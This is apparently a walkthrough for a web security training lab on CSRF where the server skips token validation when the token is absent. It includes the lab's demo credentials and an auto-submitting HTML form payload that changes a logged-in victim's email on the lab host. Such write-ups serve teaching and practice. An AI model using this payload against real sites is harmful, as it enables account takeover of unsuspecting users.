Title: CSRF where token validation depends on token being present
Level: PRACTITIONER
Desc:  This lab's email change functionality is vulnerable to CSRF.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough: 
Request without CSRF token is valid and processed by and app.
<img width="1021" height="513" alt="image" src="https://github.com/user-attachments/assets/7a6cb2c6-983b-437a-a04d-b9a9fdf0b5c3" />

```
<form method="POST" action="https://0a6d008e04ec9be6818dcad800f400b3.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test21@normal-user.net">
</form>
<script>
    // Remove any CSRF token input if it was added dynamically (safety step)
    const csrfInput = document.querySelector('input[name="csrf"]');
    if (csrfInput) csrfInput.remove();
    document.forms[0].submit();
</script>
```





